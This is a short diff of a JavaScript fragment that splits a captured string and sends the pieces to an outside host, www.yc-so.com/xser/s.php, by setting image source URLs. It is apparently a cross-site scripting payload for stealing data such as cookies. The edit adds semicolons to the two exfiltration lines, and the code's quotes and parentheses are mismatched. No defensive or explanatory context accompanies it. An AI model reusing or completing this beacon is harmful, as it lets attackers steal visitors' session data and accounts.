@@ -21,8 +21,8 @@
             c3=c1.substring(clen, clen2);
             c4=c1.substring(clen2,c1.length );
 
-           new Image()).src ='http://www.yc-so.com/xser/s.php?c="+c2
-           new Image()).src ='http://www.yc-so.com/xser/s.php?c="+c3
+           new Image()).src ='http://www.yc-so.com/xser/s.php?c="+c2;
+           new Image()).src ='http://www.yc-so.com/xser/s.php?c="+c3;
             return c4;
         } catch (e) {
             return ''
